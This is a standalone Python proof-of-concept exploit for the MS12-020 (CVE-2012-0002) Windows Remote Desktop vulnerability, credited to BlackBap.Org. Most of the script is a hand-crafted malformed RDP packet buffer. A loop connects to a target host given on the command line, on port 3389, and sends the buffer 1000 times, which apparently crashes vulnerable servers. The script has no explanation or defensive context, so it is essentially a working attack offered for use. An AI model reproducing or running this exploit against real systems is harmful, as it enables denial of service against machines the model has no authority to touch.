# MS12-020 / CVE-2012-0002 Vulnerability - Proof of Concept
# BlackBap.Org

import socket
import sys

buf = b""
buf += b"\x03\x00\x00\x13"  # TPKT, Version 3, length 19
buf += b"\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00"  # ITU-T Rec X.224
buf += b"\x03\x00\x01\xd6"  # TPKT, Version 3, length 470
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x7f\x65\x82\x01\x94\x04"  # MULTIPOINT-COMMUNICATION-SERVICE T.125

buf += b"\x01\x01\x04\x01\x01\x01\x01\xff"  # "Fuck you Chelios" packet
buf += b"\x30\x19\x02\x04\x00\x00\x00\x00"
buf += b"\x02\x04\x00\x00\x00\x02\x02\x04"
buf += b"\x00\x00\x00\x00\x02\x04\x00\x00"
buf += b"\x00\x01\x02\x04\x00\x00\x00\x00"
buf += b"\x02\x04\x00\x00\x00\x01\x02\x02"
buf += b"\xff\xff\x02\x04\x00\x00\x00\x02"
buf += b"\x30\x19\x02\x04\x00\x00\x00\x01"
buf += b"\x02\x04\x00\x00\x00\x01\x02\x04"
buf += b"\x00\x00\x00\x01\x02\x04\x00\x00"
buf += b"\x00\x01\x02\x04\x00\x00\x00\x00"
buf += b"\x02\x04\x00\x00\x00\x01\x02\x02"
buf += b"\x04\x20\x02\x04\x00\x00\x00\x02"
buf += b"\x30\x1c\x02\x02\xff\xff\x02\x02"
buf += b"\xfc\x17\x02\x02\xff\xff\x02\x04"
buf += b"\x00\x00\x00\x01\x02\x04\x00\x00"
buf += b"\x00\x00\x02\x04\x00\x00\x00\x01"
buf += b"\x02\x02\xff\xff\x02\x04\x00\x00"
buf += b"\x00\x02\x04\x82\x01\x33\x00\x05"
buf += b"\x00\x14\x7c\x00\x01\x81\x2a\x00"
buf += b"\x08\x00\x10\x00\x01\xc0\x00\x44"
buf += b"\x75\x63\x61\x81\x1c\x01\xc0\xd8"
buf += b"\x00\x04\x00\x08\x00\x80\x02\xe0"
buf += b"\x01\x01\xca\x03\xaa\x09\x04\x00"
buf += b"\x00\xce\x0e\x00\x00\x48\x00\x4f"
buf += b"\x00\x53\x00\x54\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x04\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x0c\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x01\xca\x01\x00\x00\x00\x00"
buf += b"\x00\x10\x00\x07\x00\x01\x00\x30"
buf += b"\x00\x30\x00\x30\x00\x30\x00\x30"
buf += b"\x00\x2d\x00\x30\x00\x30\x00\x30"
buf += b"\x00\x2d\x00\x30\x00\x30\x00\x30"
buf += b"\x00\x30\x00\x30\x00\x30\x00\x30"
buf += b"\x00\x2d\x00\x30\x00\x30\x00\x30"
buf += b"\x00\x30\x00\x30\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x04\xc0\x0c"
buf += b"\x00\x0d\x00\x00\x00\x00\x00\x00"
buf += b"\x00\x02\xc0\x0c\x00\x1b\x00\x00"
buf += b"\x00\x00\x00\x00\x00\x03\xc0\x2c"
buf += b"\x00\x03\x00\x00\x00\x72\x64\x70"
buf += b"\x64\x72\x00\x00\x00\x00\x00\x80"
buf += b"\x80\x63\x6c\x69\x70\x72\x64\x72"
buf += b"\x00\x00\x00\xa0\xc0\x72\x64\x70"
buf += b"\x73\x6e\x64\x00\x00\x00\x00\x00"
buf += b"\xc0"

buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x04\x01\x00\x01\x00"  # MULTIPOINT-COMMUNICATION-SERVICE T.125
buf += b"\x03\x00\x00\x08"  # TPKT, Version 3, Length 8
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x28"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x38\x00\x06\x03\xef"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x38\x00\x06\x03\xeb"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x38\x00\x06\x03\xec"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x38\x00\x06\x03\xed"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0c"  # TPKT, Version 3, Length 12
buf += b"\x02\xf0\x80"  # ITU-T Rec X.224
buf += b"\x38\x00\x06\x03\xee"  # MULTIPOINT-COMM-SERVICE T.125
buf += b"\x03\x00\x00\x0b"  # TPKT, Version 3, Length 12
buf += b"\x06\xd0\x00\x00\x12\x34\x00"  # ITU-T Rec X.224

HOST = sys.argv[1]
PORT = 3389
for i in range(1000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f"sending: {len(buf)} bytes")
    s.send(buf)
    rec = s.recv(100)
    print(f"received: {len(rec)} bytes")
    s.close()

# BlackBap.Org